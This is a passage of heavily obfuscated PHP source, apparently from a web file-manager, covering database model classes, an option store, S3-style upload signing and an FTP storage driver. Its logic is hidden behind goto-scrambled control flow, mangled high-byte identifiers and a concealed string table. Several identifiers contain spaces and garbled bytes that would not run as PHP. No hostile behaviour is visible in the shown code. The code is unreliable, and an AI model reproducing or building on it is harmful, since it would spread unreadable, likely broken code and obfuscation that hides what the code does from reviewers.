Ââ˜±) == 0) { break; } $DŠ•–Ûè× = $this->db->insertAll($f°» Ââ˜±, $DÁñ÷Øˆ×á, $dŸÌî®÷®œ); $this->chunkEventCheck(count($f°» Ââ˜±)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($EŸîÆá¬˜Ş as $b÷ŒíÉ¾Æ¹ => $b‰àßÍƒ”) { $DŠ•–Ûè× = $this->db->insert($b‰àßÍƒ”, $DÁñ÷Øˆ×á, $dŸÌî®÷®œ); } $this->commit(); } if (!1 !== $DŠ•–Ûè×) { $C§©¼İÈ£ = $this->getLastInsID(); if ($C§©¼İÈ£) { return $C§©¼İÈ£; } } return $DŠ•–Ûè×; goto FŞÊ‡¡˜„ò; FŞÊ‡¡˜„ò: } public function save($FíÊ Ñ«Ã³ = '', $A¤ˆ»¹¬À = array()) { goto a§ÁŸ‡›À; aÃ˜ÇÍÍæÔ: $cíƒŠÉ©Ú = $BÄŒ«™§±Ë[$aÊÂºÃ§æ[267]][$C±áŠ£ºµÔ][1]; $cíƒŠÉ©Ú = is_array($cíƒŠÉ©Ú) ? $cíƒŠÉ©Ú : array(); $Fé¡ÑÕ–“ = count($cíƒŠÉ©Ú); goto B­”Çİ¢ºš; a§ÁŸ‡›À: $aÊÂºÃ§æ =& $_SERVER[‡’¶øåüç˜]; $Cº‰©‚ Ïœ = self::SQL_WHERE_IN_CHUNK; $BÄŒ«™§±Ë = $this->optionsValue(); goto FÛ¼Ï’ä“; FÛ¼Ï’ä“: $C±áŠ£ºµÔ = $this->findWhereField($BÄŒ«™§±Ë); if (!$C±áŠ£ºµÔ) { return parent::save($FíÊ Ñ«Ã³, $A¤ˆ»¹¬À); } $Aé‘ƒÎ‰´ù = 0; goto aÃ˜ÇÍÍæÔ; B­”Çİ¢ºš: for ($DÀ‚Ô„Í±½ = 0; $DÀ‚Ô„Í±½ < $Fé¡ÑÕ–“; $DÀ‚Ô„Í±½ += $Cº‰©‚ Ïœ) { $E·¹“ºø‹¨ = array_slice($cíƒŠÉ©Ú, $DÀ‚Ô„Í±½, $Cº‰©‚ Ïœ); if (!is_array($E·¹“ºø‹¨) || count($E·¹“ºø‹¨) == 0) { break; } $BÄŒ«™§±Ë[$aÊÂºÃ§æ[267]][$C±áŠ£ºµÔ][1] = $E·¹“ºø‹¨; $this->optionsValue($BÄŒ«™§±Ë); $Aé‘ƒÎ‰´ù += parent::save($FíÊ Ñ«Ã³, $A¤ˆ»¹¬À); $this->chunkEventCheck(count($E·¹“ºø‹¨)); } $this->chunkEventSet(); return $Aé‘ƒÎ‰´ù; goto BÔÇ²äª‡; BÔÇ²äª‡: } public function add($a¬òí½ìñ… = '', $aéÔí³Õ¿ = array(), $a‹ÌÖí‘‰„ = false) { if ($this->addTaskStatus && is_array($a¬òí½ìñ…)) { $this->addTaskData[] = $a¬òí½ìñ…; return; } return parent::add($a¬òí½ìñ…, $aéÔí³Õ¿, $a‹ÌÖí‘‰„); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CçŞ÷•å…§ = array()) { goto Eó ‹ã×›ğ; EÅ§Ò‹¢ç: $AÉíİâĞ‘Ü = $this->findWhereField($B…Óƒ¶ Ñ); if (!$AÉíİâĞ‘Ü || isset($B…Óƒ¶ Ñ[$Dí´Ì­¿­[284]]) || isset($B…Óƒ¶ Ñ[$Dí´Ì­¿­[344]])) { return parent::select($CçŞ÷•å…§); } $F´‡Û”é¾š = $B…Óƒ¶ Ñ[$Dí´Ì­¿­[267]][$AÉíİâĞ‘Ü][1]; goto fìÈ¿ÌÅÎ; fìÈ¿ÌÅÎ: $F´‡Û”é¾š = is_array($F´‡Û”é¾š) ? $F´‡Û”é¾š : array(); $E®ãñ”¿Šá = null; for ($C¸âé±àº« = 0; $C¸âé±àº« < count($F´‡Û”é¾š); $C¸âé±àº« += $cƒĞ¨Œµ«ñ) { $e¥‹¯ƒÀ©Ô = array_slice($F´‡Û”é¾š, $C¸âé±àº«, $cƒĞ¨Œµ«ñ); if (!is_array($e¥‹¯ƒÀ©Ô) || count($e¥‹¯ƒÀ©Ô) == 0) { break; } $B…Óƒ¶ Ñ[$Dí´Ì­¿­[267]][$AÉíİâĞ‘Ü][1] = $e¥‹¯ƒÀ©Ô; $this->optionsValue($B…Óƒ¶ Ñ); $C²Šñ„ˆñÆ = parent::select($CçŞ÷•å…§); if (!$C²Šñ„ˆñÆ) { continue; } if (is_null($E®ãñ”¿Šá)) { $E®ãñ”¿Šá = array(); } $E®ãñ”¿Šá = array_merge($E®ãñ”¿Šá, $C²Šñ„ˆñÆ); } goto eİ‚óĞ§àÎ; Eó ‹ã×›ğ: $Dí´Ì­¿­ =& $_SERVER[‡’¶øåüç˜]; $cƒĞ¨Œµ«ñ = self::SQL_WHERE_IN_CHUNK; $B…Óƒ¶ Ñ = $this->optionsValue(); goto EÅ§Ò‹¢ç; eİ‚óĞ§àÎ: return $E®ãñ”¿Šá; goto A®æ£“Í“ò; A®æ£“Í“ò: } public function delete($A¡ìˆÛ‰ù = array()) { goto A•ºÕ‹—È; dî¹é‰„¼‹: return $CÍø¬Ç…ìÖ; goto cå™®Ö; A•ºÕ‹—È: $E§ç§‹š =& $_SERVER[‡’¶øåüç˜]; $B óÜ»·£å = self::SQL_WHERE_IN_CHUNK; $D‘õÙã Ò™ = $this->optionsValue(); goto bå“å²÷›à; c©·™„ë¢¬: $c³’¨ô ĞÂ = $D‘õÙã Ò™[$E§ç§‹š[267]][$d‡èÛ‡™©±][1]; $c³’¨ô ĞÂ = is_array($c³’¨ô ĞÂ) ? $c³’¨ô ĞÂ : array(); for ($BÂÏÈ‡®÷„ = 0; $BÂÏÈ‡®÷„ < count($c³’¨ô ĞÂ); $BÂÏÈ‡®÷„ += $B óÜ»·£å) { $d¾ïˆ¶’‚ò = array_slice($c³’¨ô ĞÂ, $BÂÏÈ‡®÷„, $B óÜ»·£å); if (!is_array($d¾ïˆ¶’‚ò) || count($d¾ïˆ¶’‚ò) == 0) { break; } $D‘õÙã Ò™[$E§ç§‹š[267]][$d‡èÛ‡™©±][1] = $d¾ïˆ¶’‚ò; $this->optionsValue($D‘õÙã Ò™); $CÍø¬Ç…ìÖ += parent::delete($A¡ìˆÛ‰ù); } goto dî¹é‰„¼‹; bå“å²÷›à: $d‡èÛ‡™©± = $this->findWhereField($D‘õÙã Ò™); if (!$d‡èÛ‡™©±) { return parent::delete($A¡ìˆÛ‰ù); } $CÍø¬Ç…ìÖ = 0; goto c©·™„ë¢¬; cå™®Ö: } private function findWhereField($CÓŠ—óéäÆ) { $EØøÚ×¹Õ =& $_SERVER[‡’¶øåüç˜]; $AĞ¨µÌ±«ø = self::SQL_WHERE_IN_CHUNK; if (!is_array($CÓŠ—óéäÆ) || !is_array($CÓŠ—óéäÆ[$EØøÚ×¹Õ[267]])) { return !1; } foreach ($CÓŠ—óéäÆ[$EØøÚ×¹Õ[267]] as $C™«õìÌóÙ => $A†Ì–í©í‘) { if (is_array($A†Ì–í©í‘) && isset($A†Ì–í©í‘[0]) && is_string($A†Ì–í©í‘[0]) && strtolower($A†Ì–í©í‘[0]) == $EØøÚ×¹Õ[7] && is_array($A†Ì–í©í‘[1]) && count($A†Ì–í©í‘[1]) > $AĞ¨µÌ±«ø) { ignore_timeout(); return $C™«õìÌóÙ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\145\x6d\117\160\164\x69\x6f\156"; public $field = array(); public function listData($f‹‡®Ç­‰ = false, $cÜˆ÷©‡· = "\x6d\x6f\144\x69\146\x79\124\151\x6d\x65", $c¼è®Ï°‚ã = false) { $EÙƒó÷Ÿ°ò = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$EÙƒó÷Ÿ°ò) { return $f‹‡®Ç­‰ ? null : array(); } if (!$f‹‡®Ç­‰) { $EÙƒó÷Ÿ°ò = array_filter(array_values($EÙƒó÷Ÿ°ò)); return array_sort_by($EÙƒó÷Ÿ°ò, $cÜˆ÷©‡·, $c¼è®Ï°‚ã); } return $EÙƒó÷Ÿ°ò[$_SERVER[‡’¶øåüç˜][368] . $f‹‡®Ç­‰]; } public function insert($F‘ê¼‹ö²‘) { goto B¶¤ˆÛ‘Ø; C÷”† Ÿ’‡: $E×­™ËÂÇ = $E×­™ËÂÇ ? $E×­™ËÂÇ : 0; $F‘ê¼‹ö²‘[$EğÔõã©Ï´[371]] = ++$E×­™ËÂÇ; $F‘ê¼‹ö²‘[$EğÔõã©Ï´[191]] = time(); goto A©»èÅ¥õŒ; B¶¤ˆÛ‘Ø: $EğÔõã©Ï´ =& $_SERVER[‡’¶øåüç˜]; $F‘ê¼‹ö²‘ = array_field_key($F‘ê¼‹ö²‘, $this->field); $E×­™ËÂÇ = Model($this->modelType)->get($EğÔõã©Ï´[369], $this->optionType . $EğÔõã©Ï´[370]); goto C÷”† Ÿ’‡; d´¨æßä•É: return $E×­™ËÂÇ; goto Aâé—­ìå; A©»èÅ¥õŒ: $F‘ê¼‹ö²‘[$EğÔõã©Ï´[107]] = time(); Model($this->modelType)->set($EğÔõã©Ï´[369], $E×­™ËÂÇ, $this->optionType . $EğÔõã©Ï´[370]); Model($this->modelType)->set($EğÔõã©Ï´[368] . $E×­™ËÂÇ, $F‘ê¼‹ö²‘, $this->optionType); goto d´¨æßä•É; Aâé—­ìå: } public function update($bêÕë¿òÃ—, $bõ­–ÊÅÆß) { goto B×Šˆ¼•š; CŒÄ‰ïğŒ²: return Model($this->modelType)->set($Fø’ĞñçÑ[368] . $bêÕë¿òÃ—, $bõ­–ÊÅÆß, $this->optionType); goto Dù©ãÚ³Š; B×Šˆ¼•š: $Fø’ĞñçÑ =& $_SERVER[‡’¶øåüç˜]; $bõ­–ÊÅÆß = array_field_key($bõ­–ÊÅÆß, $this->field); $FÑŞ‡í³åÆ = $this->listData($bêÕë¿òÃ—); goto f¾ÍŠÑø‰Ë; f¾ÍŠÑø‰Ë: if (!$FÑŞ‡í³åÆ) { return !1; } $bõ­–ÊÅÆß = array_merge($FÑŞ‡í³åÆ, $bõ­–ÊÅÆß); $bõ­–ÊÅÆß[$Fø’ĞñçÑ[107]] = time(); goto CŒÄ‰ïğŒ²; Dù©ãÚ³Š: } public function remove($eÂˆÃ’™¿˜) { return Model($this->modelType)->remove($_SERVER[‡’¶øåüç˜][368] . $eÂˆÃ’™¿˜, $this->optionType); } public function clear() { $B¦„®îí¼ä =& $_SERVER[‡’¶øåüç˜]; Model($this->modelType)->remove($B¦„®îí¼ä[369], $this->optionType . $B¦„®îí¼ä[370]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eŒ˜¬­ È¥, $fÊÁñ«³È¦) { if (!$fÊÁñ«³È¦) { return !1; } $BÖ”„ˆŠÎ¦ = $this->listData(); $BÖ”„ˆŠÎ¦ = array_to_keyvalue($BÖ”„ˆŠÎ¦, $eŒ˜¬­ È¥); return isset($BÖ”„ˆŠÎ¦[$fÊÁñ«³È¦]) ? $BÖ”„ˆŠÎ¦[$fÊÁñ«³È¦] : !1; } public function findByName($AæŠ•¶ŞÕ•) { return $this->findByKey($_SERVER[‡’¶øåüç˜][28], $AæŠ•¶ŞÕ•); } protected function resetData($AÁ‡Šñß£Ô) { $f’ßÅóŒ‰ =& $_SERVER[‡’¶øåüç˜]; $AÁ‡Šñß£Ô = is_array($AÁ‡Šñß£Ô) ? $AÁ‡Šñß£Ô : array(); $A–¼‘£¯‰§ = array(); for ($aÕï¦Šë…Æ = 0; $aÕï¦Šë…Æ < count($AÁ‡Šñß£Ô); $aÕï¦Šë…Æ++) { $A–¼‘£¯‰§[$f’ßÅóŒ‰[368] . $AÁ‡Šñß£Ô[$aÕï¦Šë…Æ][$f’ßÅóŒ‰[371]]] = $AÁ‡Šñß£Ô[$aÕï¦Šë…Æ]; } return Model($this->modelType)->set($A–¼‘£¯‰§, !1, $this->optionType); } private function getAutoName($D‰”“÷‹Œ‰) { $e¸¿“…ĞŠ = array_to_keyvalue($this->listData(), $_SERVER[‡’¶øåüç˜][28]); if (!$e¸¿“…ĞŠ || !isset($e¸¿“…ĞŠ[$D‰”“÷‹Œ‰])) { return $D‰”“÷‹Œ‰; } for ($e¸‚İ–ÜŸ = 1; $e¸‚İ–ÜŸ < count($e¸¿“…ĞŠ); $e¸‚İ–ÜŸ++) { $aó­ÕÂ™‹Î = $D‰”“÷‹Œ‰ . "\x28{$e¸‚İ–ÜŸ}\x29"; if (!isset($e¸¿“…ĞŠ[$aó­ÕÂ™‹Î])) { return $aó­ÕÂ™‹Î; } } return $aó­ÕÂ™‹Î; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($dô ³‰ÚÑ = false, $fÚŠå¾…Õ‹ = '', $E•õœ›Î§¤ = false) { goto d±ÀÖ‚÷Î»; F‹µî­‘ì–: $bˆËßí¤Å‹ = is_array($bˆËßí¤Å‹) ? $bˆËßí¤Å‹ : array(); if (is_array($cñî–ßÅøì)) { $cñî–ßÅøì = array_merge($bˆËßí¤Å‹, $cñî–ßÅøì); return $dô ³‰ÚÑ ? isset($cñî–ßÅøì[$dô ³‰ÚÑ]) ? $cñî–ßÅøì[$dô ³‰ÚÑ] : null : $cñî–ßÅøì; } $EÙ‘ÌÑ—ì² = $this->filterWhere(array($f»”Ğš…Ø[29] => $fÚŠå¾…Õ‹)); goto Fõã‡ç¦; C¶‹ŸÏ­…Ú: $this->cacheSet($fÚŠå¾…Õ‹, $cñî–ßÅøì); $cñî–ßÅøì = array_merge($bˆËßí¤Å‹, $cñî–ßÅøì); return $dô ³‰ÚÑ ? $cñî–ßÅøì[$dô ³‰ÚÑ] : $cñî–ßÅøì; goto B³†ƒàÕ–; d±ÀÖ‚÷Î»: $f»”Ğš…Ø =& $_SERVER[‡’¶øåüç˜]; $cñî–ßÅøì = $this->cacheGet($fÚŠå¾…Õ‹); $bˆËßí¤Å‹ = $this->optionDefault($fÚŠå¾…Õ‹); goto F‹µî­‘ì–; Fõã‡ç¦: $cñî–ßÅøì = $this->where($EÙ‘ÌÑ—ì²)->select(); $cñî–ßÅøì = array_to_keyvalue($cñî–ßÅøì, $f»”Ğš…Ø[89], $f»”Ğš…Ø[363]); foreach ($cñî–ßÅøì as $bí¶ÀË„Ó => $E·êƒÒõÆ) { if ($E•õœ›Î§¤ || in_array($bí¶ÀË„Ó, $this->jsonField)) { $cñî–ßÅøì[$bí¶ÀË„Ó] = json_decode($E·êƒÒõÆ, !0); } } goto C¶‹ŸÏ­…Ú; B³†ƒàÕ–: } public function set($d¶†±ÎˆÓ, $a«‰¢µé’² = false, $D›Åš¥…šñ = '') { goto AäÀ¢ã„¹Ğ; AäÀ¢ã„¹Ğ: $A¶´ïã²èÜ =& $_SERVER[‡’¶øåüç˜]; $this->cacheRemove($D›Åš¥…šñ); $f”ÈíÖè¤É = array(); goto bóåÙ‰Ã„; bóåÙ‰Ã„: $f‹¯ğù¶šÀ = is_array($d¶†±ÎˆÓ) ? $d¶†±ÎˆÓ : array($d¶†±ÎˆÓ => $a«‰¢µé’²); foreach ($f‹¯ğù¶šÀ as $Cîğ…ÖË©‡ => $CõŠƒƒˆ¶) { if (is_array($CõŠƒƒˆ¶)) { $CõŠƒƒˆ¶ = json_encode_force($CõŠƒƒˆ¶); } $this->checkLength($CõŠƒƒˆ¶, !1, $this->tableName . $A¶´ïã²èÜ[4] . $d¶†±ÎˆÓ); $CõŠƒƒˆ¶ = self::textEncode($CõŠƒƒˆ¶); $f‹¯ğù¶šÀ = array($A¶´ïã²èÜ[29] => $D›Åš¥…šñ, $A¶´ïã²èÜ[89] => $Cîğ…ÖË©‡, $A¶´ïã²èÜ[363] => $CõŠƒƒˆ¶); $f”ÈíÖè¤É[] = $this->filterWhere($f‹¯ğù¶šÀ); } if (!$f”ÈíÖè¤É) { return !0; } goto B÷™ÚÖ„Â®; B÷™ÚÖ„Â®: return $this->addAll($f”ÈíÖè¤É, array(), !0); goto D–ØéåÕ¹²; D–ØéåÕ¹²: } protected function optionDefault($FÉ†‹‚‰‹¢ = '') { return !1; } public function setDeep($CĞÙ”æÌáê, $EŸ®àš±ßµ = false, $C°‡ô’½«¤ = '') { $EŠè˜·©É¸ = explode($_SERVER[‡’¶øåüç˜][91], $CĞÙ”æÌáê); $fñ¶‘„Ğºª = $this->get(); array_set_value($fñ¶‘„Ğºª, $CĞÙ”æÌáê, $EŸ®àš±ßµ); $this->set($EŠè˜·©É¸[0], $fñ¶‘„Ğºª[$EŠè˜·©É¸[0]], $C°‡ô’½«¤); } public function remove($fÂÛ Ã‰éó, $BÒÓŠËŸñæ = '') { $A¹ŞÓßæ­ê =& $_SERVER[‡’¶øåüç˜]; $this->cacheRemove($BÒÓŠËŸñæ); $e´Í±È·±Ç = $this->filterWhere(array($A¹ŞÓßæ­ê[89] => $fÂÛ Ã‰éó, $A¹ŞÓßæ­ê[29] => $BÒÓŠËŸñæ)); if (is_null($fÂÛ Ã‰éó)) { unset($e´Í±È·±Ç[$A¹ŞÓßæ­ê[89]]); } return $this->where($e´Í±È·±Ç)->delete(); } public function cacheSet($F‹İ¢È£æ£, $C†íƒì‚©º = false) { return Cache::set($this->cacheKey($F‹İ¢È£æ£), $C†íƒì‚©º); } public function cacheGet($BÆâ‹×Š…) { return Cache::get($this->cacheKey($BÆâ‹×Š…)); } public function cacheRemove($aé¨Òªî†˜) { return Cache::remove($this->cacheKey($aé¨Òªî†˜)); } protected function filterWhere($AêåËœ¤Ì) { return $AêåËœ¤Ì; } protected function cacheKey($dßÏØ·›³) { return $dßÏØ·›³; } } goto FõË¹õæÖ; Dç°›ã¥Š: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($aœÉ‚õÑ‘Ç) { parent::__construct($aœÉ‚õÑ‘Ç); $this->signatureVersion($_SERVER[‡’¶øåüç˜][204]); } public function uploadFormData($BÁ¿õ–¤ç, $eÁö–Úìãè = 3600) { goto A‹¦Œ½©Í; EÈµ’ñ¡Ó: $AÍµôÓª¾¯ = $fçîë•Œ³[59]; $DŒí…†¯˜¨ = gmdate($fçîë•Œ³[1142]); $EÍ«…É¥È½ = gmdate($fçîë•Œ³[696]); goto F°«¶‹—»Á; A‹¦Œ½©Í: $fçîë•Œ³ =& $_SERVER[‡’¶øåüç˜]; $EÆòåìˆ = $fçîë•Œ³[189]; $DÇÔÚ²èÈõ = $fçîë•Œ³[1141]; goto EÈµ’ñ¡Ó; DêÙõ¥Œİ: $eá¶æˆí¦‡ = array($fçîë•Œ³[203] => $fçîë•Œ³[33], $fçîë•Œ³[1153] => $fçîë•Œ³[33], $fçîë•Œ³[1111] => $EÆòåìˆ, $fçîë•Œ³[1115] => $aÓ½’ÇÇ¤, $fçîë•Œ³[1119] => $cİ£‰ëï¡, $fçîë•Œ³[1154] => $A¦õĞš—ÊÖ, $fçîë•Œ³[1155] => $DÇÔÚ²èÈõ, $fçîë•Œ³[1156] => $DŒí…†¯˜¨, $fçîë•Œ³[1157] => $cè›î‚Šš, $fçîë•Œ³[1158] => $D“›¸õ¨ƒ, $fçîë•Œ³[173] => $this->getHost()); return $eá¶æˆí¦‡; goto DÜÆ•ÖíâŸ; aÖœ‰ïÓ¡‚: $døõÀÛæÈ = array($this->accessKey, $EÍ«…É¥È½, $this->region, $AÍµôÓª¾¯, $dÃ½®ŠÁÒ); $A¦õĞš—ÊÖ = implode($fçîë•Œ³[8], $døõÀÛæÈ); $cçˆÇåô¡‰ = array($fçîë•Œ³[1109] => gmdate($fçîë•Œ³[1108], strtotime($fçîë•Œ³[1144])), $fçîë•Œ³[1110] => array(array($fçîë•Œ³[1112] => $this->bucket), array($fçîë•Œ³[1111] => $EÆòåìˆ), array($fçîë•Œ³[1113], $fçîë•Œ³[1114], $fçîë•Œ³[33]), array($fçîë•Œ³[1113], $fçîë•Œ³[1145], $fçîë•Œ³[33]), array($fçîë•Œ³[1113], $fçîë•Œ³[1146], $fçîë•Œ³[33]), array($fçîë•Œ³[1115] => $aÓ½’ÇÇ¤), array($fçîë•Œ³[1147] => $A¦õĞš—ÊÖ), array($fçîë•Œ³[1148] => $DÇÔÚ²èÈõ), array($fçîë•Œ³[1149] => $DŒí…†¯˜¨), array($fçîë•Œ³[1150] => $cè›î‚Šš))); goto EÍ²îî¿ßÄ; EÍ²îî¿ßÄ: $cİ£‰ëï¡ = base64_encode(json_encode($cçˆÇåô¡‰)); $EÇãÃÎÍ = hash_hmac($fçîë•Œ³[1151], $EÍ«…É¥È½, $fçîë•Œ³[1152] . $this->secret, !0); $bìŸ¢®Ğ¹³ = hash_hmac($fçîë•Œ³[1151], $this->region, $EÇãÃÎÍ, !0); goto C© ŞœŞ; C© ŞœŞ: $Fã³Ôãçƒä = hash_hmac($fçîë•Œ³[1151], $AÍµôÓª¾¯, $bìŸ¢®Ğ¹³, !0); $BŠï±ÂöÔ‚ = hash_hmac($fçîë•Œ³[1151], $dÃ½®ŠÁÒ, $Fã³Ôãçƒä, !0); $D“›¸õ¨ƒ = hash_hmac($fçîë•Œ³[1151], $cİ£‰ëï¡, $BŠï±ÂöÔ‚); goto DêÙõ¥Œİ; F°«¶‹—»Á: $dÃ½®ŠÁÒ = $fçîë•Œ³[1143]; $cè›î‚Šš = $eÁö–Úìãè . $fçîë•Œ³[33]; $aÓ½’ÇÇ¤ = $fçîë•Œ³[1107]; goto aÖœ‰ïÓ¡‚; DÜÆ•ÖíâŸ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($aÎÂ‹ĞßÊ) { parent::__construct(); if (count($aÎÂ‹ĞßÊ) > 0) { $this->_init($aÎÂ‹ĞßÊ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($CƒçÀšßïƒ) { $eóÓèª¢ÁÒ =& $_SERVER[‡’¶øåüç˜]; global $config; $this->appCharset = $config[$eóÓèª¢ÁÒ[1159]]; $this->systemCharset = $config[$eóÓèª¢ÁÒ[1160]]; if (isset($CƒçÀšßïƒ[$eóÓèª¢ÁÒ[1161]]) && $CƒçÀšßïƒ[$eóÓèª¢ÁÒ[1161]]) { $this->systemCharset = $CƒçÀšßïƒ[$eóÓèª¢ÁÒ[1161]]; } } public function iconvApp($A–Á²§¿÷ø) { return $this->iconvTo($A–Á²§¿÷ø, $this->systemCharset, $this->appCharset); } public function iconvSystem($Aôàì…äÕÆ) { return $this->iconvTo($Aôàì…äÕÆ, $this->appCharset, $this->systemCharset); } public function getPathOuter($eÉã½ÈÁòƒ) { goto C…ŠÏÍâ—ë; C…ŠÏÍâ—ë: $C±Ùö™ê™Ú =& $_SERVER[‡’¶øåüç˜]; $cöîó“•ùë = $this->iconvApp($this->pathBase); $eÉã½ÈÁòƒ = $this->iconvApp($eÉã½ÈÁòƒ); goto d’†¥‚Ø­; Dâ˜‘©„œí: return $this->pathDriver . $C±Ùö™ê™Ú[8] . ltrim($eÉã½ÈÁòƒ, $C±Ùö™ê™Ú[8]); goto cí’‰•¢ÜÊ; d’†¥‚Ø­: if (substr($cöîó“•ùë, 0, 2) == $C±Ùö™ê™Ú[1162]) { $cöîó“•ùë = BASIC_PATH . substr($cöîó“•ùë, 2); } if (substr($eÉã½ÈÁòƒ, 0, 2) == $C±Ùö™ê™Ú[1162]) { $eÉã½ÈÁòƒ = BASIC_PATH . substr($eÉã½ÈÁòƒ, 2); } $cöîó“•ùë = KodIO::clear($cöîó“•ùë); goto a·¬ÜÛ¦”š; a·¬ÜÛ¦”š: $eÉã½ÈÁòƒ = KodIO::clear($eÉã½ÈÁòƒ); $eÉã½ÈÁòƒ = substr($eÉã½ÈÁòƒ, strlen($cöîó“•ùë)); if (empty($this->pathDriver)) { return $eÉã½ÈÁòƒ; } goto Dâ˜‘©„œí; cí’‰•¢ÜÊ: } private function _init($aĞíãÁ­ä = array()) { $AŒÃ°ŠÀ¥Â =& $_SERVER[‡’¶øåüç˜]; if (!function_exists($AŒÃ°ŠÀ¥Â[1163])) { throw new Exception(LNG($AŒÃ°ŠÀ¥Â[1164])); } $this->config = $aĞíãÁ­ä; $this->charsetReset($aĞíãÁ­ä); foreach ($aĞíãÁ­ä as $E…¯°§Û¬ğ => $fÎ÷ˆŠ…‘) { if (isset($this->{$E…¯°§Û¬ğ})) { $this->{$E…¯°§Û¬ğ} = $fÎ÷ˆŠ…‘; } } return $this->_login($aĞíãÁ­ä); } private function _login($aç±»ïöåå) { goto E„è´µ¹¨†; E„è´µ¹¨†: $a˜ƒµ‰àÍÒ =& $_SERVER[‡’¶øåüç˜]; static $béëöÃ‡Ù = array(); $A¿ß±ßŸÃ = md5(json_encode($aç±»ïöåå)); goto bìĞ¿Í¡Ğê; bìĞ¿Í¡Ğê: if (isset($béëöÃ‡Ù[$A¿ß±ßŸÃ])) { foreach ($béëöÃ‡Ù[$A¿ß±ßŸÃ] as $eÁè´âÑ²æ => $D‚šÌ†¾œß) { $this->{$eÁè´âÑ²æ} = $D‚šÌ†¾œß; } return !0; } $Eïõá”ÔË = parse_url(trim($this->server, $a˜ƒµ‰àÍÒ[8])); $this->host = $Eïõá”ÔË[$a˜ƒµ‰àÍÒ[173]]; goto A¾ˆó¼‚µ¡; bº²é£Î•‹: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $BçêøÒÎ•† = @ftp_login($this->connect, $this->username, $this->userpass); goto FŠé®‚ÌŠ©; d•‰š…ºß: $béëöÃ‡Ù[$A¿ß±ßŸÃ] = array($a˜ƒµ‰àÍÒ[1168] => $this->connect, $a˜ƒµ‰àÍÒ[173] => $this->host, $a˜ƒµ‰àÍÒ[172] => $this->scheme, $a˜ƒµ‰àÍÒ[174] => $this->port); return $BçêøÒÎ•†; goto dˆÎ¶ƒ¨òœ; A¾ˆó¼‚µ¡: $bõ›ğÃ†øÈ = isset($Eïõá”ÔË[$a˜ƒµ‰àÍÒ[172]]) && $Eïõá”ÔË[$a˜ƒµ‰àÍÒ[172]] == $a˜ƒµ‰àÍÒ[1165] ? !0 : !1; $this->scheme = $bõ›ğÃ†øÈ ? $a˜ƒµ‰àÍÒ[1166] : $a˜ƒµ‰àÍÒ[1167]; $this->port = isset($Eïõá”ÔË[$a˜ƒµ‰àÍÒ[174]]) ? $Eïõá”ÔË[$a˜ƒµ‰àÍÒ[174]] : 21; goto bº²é£Î•‹; FŠé®‚ÌŠ©: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $EÖŒ×ì„£¸ = $this->pasv == $a˜ƒµ‰àÍÒ[83] ? !0 : !1; @ftp_pasv($this->connect, $EÖŒ×ì„£¸); goto d•‰š…ºß; dˆÎ¶ƒ¨òœ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($f‡¥êåÀÁŠ, $E„›ªÇÚ· = '', $B‰’ˆôøá§ = REPEAT_RENAME) { if ($this->setContent($f‡¥êåÀÁŠ, $E„›ªÇÚ·)) { return $this->getPathOuter($f‡¥êåÀÁŠ); } return !1; } public function mkdir($c‘ÛâºŞ§‡, $CĞåŞ´™˜ò = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $c‘ÛâºŞ§‡ = $this->iconvSystem($c‘ÛâºŞ§‡); if ($this->isFolder($c‘ÛâºŞ§‡) || @ftp_mkdir($this->connect, $c‘ÛâºŞ§‡)) { return $this->getPathOuter($c‘ÛâºŞ§‡); } if (!$this->mkdir($this->pathFather($c‘ÛâºŞ§‡))) { return !1; } if ($c‘ÛâºŞ§‡ = @ftp_mkdir($this->connect, $c‘ÛâºŞ§‡)) { return $this->getPathOuter($c‘ÛâºŞ§‡); } return !1; } public function copyFile($CÛ’¡Í×šµ, $bÂÁÖ´ŠáÔ) { goto fËßâÛ×’›; fËßâÛ×’›: if (!$this->_isconn()) { return !1; } $a¿­µ•®Å™ = $this->pathThis($this->iconvSystem($CÛ’¡Í×šµ)); $DĞèßòÄ¼± = $this->tempFile($a¿­µ•®Å™); goto dñ£ƒî‚¹; dñ£ƒî‚¹: $D¢‡òÎëÌ¿ = $this->iconvApp($DĞèßòÄ¼±); $this->download($CÛ’¡Í×šµ, $D¢‡òÎëÌ¿); $aƒÔÈÄå è = $this->upload($bÂÁÖ´ŠáÔ, $D¢‡òÎëÌ¿); goto b†÷ÑŠµê; b†÷ÑŠµê: $this->tempFileRemve($DĞèßòÄ¼±); return $aƒÔÈÄå è; goto BËìö†ˆ°Æ; BËìö†ˆ°Æ: } public function moveFile($DÊ’éŸ­É, $Dáìí‰§İï) { if (!$this->_isconn()) { return !1; } $DÊ’éŸ­É = $this->iconvSystem($DÊ’éŸ­É); $Dáìí‰§İï = $this->iconvSystem($Dáìí‰§İï); $EÒòßô£Æ = @ftp_rename($this->connect, $DÊ’éŸ­É, $Dáìí‰§İï); return $EÒòßô£Æ ? $this->getPathOuter($Dáìí‰§İï) : !1; } public function delFile($bŒº¡°¼ËÊ) { if (!$this->_isconn()) { return !1; } $bŒº¡°¼ËÊ = $this->iconvSystem($bŒº¡°¼ËÊ); return @ftp_delete($this->connect, $bŒº¡°¼ËÊ); } public function delFolder($BÖ¹é„ÊÜç) { if (!$this->_isconn()) { return !1; } $BÖ¹é„ÊÜç = $this->iconvSystem($BÖ¹é„ÊÜç); $e‚»õ¼Î©† = $this->ftpList($BÖ¹é„ÊÜç); if (!$e‚»õ¼Î©†) { return 